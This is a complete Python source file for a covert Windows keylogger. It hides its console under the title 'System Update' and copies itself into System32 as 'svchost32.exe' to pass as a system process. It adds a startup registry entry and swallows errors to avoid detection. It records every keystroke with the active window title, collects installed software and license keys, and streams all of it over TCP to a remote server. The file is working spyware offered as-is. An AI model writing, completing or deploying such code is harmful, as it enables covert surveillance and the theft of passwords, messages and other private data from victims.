import socket
import threading
import time
import win32gui
import winreg
from pynput import keyboard
import queue
import json
import os
from datetime import datetime
import ctypes
import sys
import shutil

class KeyloggerClient:
    def __init__(self, server_host, server_port):
        self.SERVER_HOST = server_host
        self.SERVER_PORT = server_port
        self.client_socket = None
        self.connected = False
        self.data_queue = queue.Queue()
        self.current_window = None
        self.reconnection_interval = 5  # seconds

        # Hide the console window
        ctypes.windll.kernel32.SetConsoleTitleW("System Update")
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

        # Set persistence
        self.set_persistence()

    def set_persistence(self):
        """Move the executable to System32 and create a registry entry for persistence."""
        try:
            # Target path for persistence
            system_path = os.path.join(os.environ['SYSTEMROOT'], 'System32')
            new_executable_path = os.path.join(system_path, 'svchost32.exe')  # Mimic a common service name
            current_executable_path = os.path.abspath(sys.argv[0])

            # Move the executable if not already in the target path
            if current_executable_path.lower() != new_executable_path.lower():
                shutil.copy2(current_executable_path, new_executable_path)
                self.create_registry_entry(new_executable_path)
                os.startfile(new_executable_path)  # Launch from the new location
                sys.exit(0)  # Exit original script to avoid duplicate running

            # Set up registry entry if moved
            self.create_registry_entry(new_executable_path)
        except Exception as e:
            pass  # Silently handle any exceptions to avoid detection

    def create_registry_entry(self, executable_path):
        """Create a registry entry pointing to the executable for startup."""
        try:
            registry_key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            startup_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_key_path, 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(startup_key, "Windows Host Service", 0, winreg.REG_SZ, f'"{executable_path}"')
            startup_key.Close()
        except Exception as e:
            pass  # Suppress all errors

    def connect(self):
        """Establish connection to server with retry mechanism."""
        while True:
            try:
                if not self.connected:
                    self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    self.client_socket.connect((self.SERVER_HOST, self.SERVER_PORT))
                    self.connected = True
                    self.send_queued_data()
                    self.queue_software_info()
                return True
            except socket.error:
                time.sleep(self.reconnection_interval)

    def send_queued_data(self):
        """Send all queued data to server."""
        while not self.data_queue.empty():
            try:
                data = self.data_queue.get()
                self.client_socket.sendall(json.dumps(data).encode('utf-8') + b'\n')
            except socket.error:
                self.data_queue.put(data)
                self.connected = False
                break

    def queue_data(self, data_type, content):
        """Queue data with timestamp and type."""
        data = {
            'timestamp': datetime.now().isoformat(),
            'type': data_type,
            'content': content
        }
        self.data_queue.put(data)
        if self.connected:
            self.send_queued_data()
        else:
            self.connect()

    def fetch_installed_software_from_registry(self):
        """Fetch installed applications and their versions and licenses from registry files."""
        software_list = []
        reg_paths = [
            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
        ]
        for reg_path in reg_paths:
            try:
                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
                for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
                    try:
                        sub_key_name = winreg.EnumKey(reg_key, i)
                        sub_key = winreg.OpenKey(reg_key, sub_key_name)
                        name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
                        version = winreg.QueryValueEx(sub_key, "DisplayVersion")[0] if winreg.QueryValueEx(sub_key, "DisplayVersion") else "Unknown"
                        license_key = winreg.QueryValueEx(sub_key, "LicenseKey")[0] if winreg.QueryValueEx(sub_key, "LicenseKey") else "Unknown"
                        software_list.append(f"{name} - Version: {version} - License: {license_key}")
                    except EnvironmentError:
                        continue
            except Exception as e:
                pass
        return software_list

    def queue_software_info(self):
        """Queue software information."""
        software_list = self.fetch_installed_software_from_registry()
        log_content = "\n".join(software_list)
        self.queue_data('software_info', log_content)

    def start_keylogger(self):
        """Start the keylogger with window tracking."""
        def on_press(key):
            try:
                active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                if active_window != self.current_window:
                    self.current_window = active_window
                    self.queue_data('window_change', active_window)
                key_data = None
                if hasattr(key, 'char') and key.char:
                    key_data = key.char
                elif key == keyboard.Key.space:
                    key_data = ' '
                elif key == keyboard.Key.enter:
                    key_data = '\n'
                elif key == keyboard.Key.backspace:
                    key_data = '[BACKSPACE]'
                else:
                    key_data = f'[{key.name}]'
                if key_data:
                    self.queue_data('keypress', key_data)
            except Exception as e:
                pass

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def run(self):
        """Start the client operation."""
        try:
            self.connect()
            keylogger_thread = threading.Thread(target=self.start_keylogger)
            keylogger_thread.daemon = True
            keylogger_thread.start()
            while True:
                if not self.connected:
                    self.connect()
                time.sleep(1)
        except KeyboardInterrupt:
            if self.client_socket:
                self.client_socket.close()

if __name__ == "__main__":
    client = KeyloggerClient('192.168.1.1', 5001)
    client.run()
